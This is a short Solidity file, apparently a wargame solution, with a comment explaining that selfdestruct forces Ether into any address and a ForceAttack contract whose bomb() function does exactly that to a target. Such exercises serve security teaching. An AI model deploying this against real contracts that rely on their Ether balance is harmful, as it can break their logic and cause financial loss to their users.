// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

/* We should make the contract ownable because in a real-world scenario you will not want
others to use your attacking contract. It is not necessary for this solution though.
The Ownable contract of OpenZeppelin will atribute ownership to the deployer and comes 
with a nice "onlyOwner()" modifier for us to use in protected functions.

This contract is a "bomb" contract. In the EVM, a contract can self-destruct and when it does
that all Ether is sent to an address. This Ether is sent EVEN if the target address has no
fallback function. Any contract that relies on it's Ether balance for anything could be a
target for a "bomb" contract.*/

contract ForceAttack{

  function bomb(address payable target) payable public {
    selfdestruct(target);
  }

}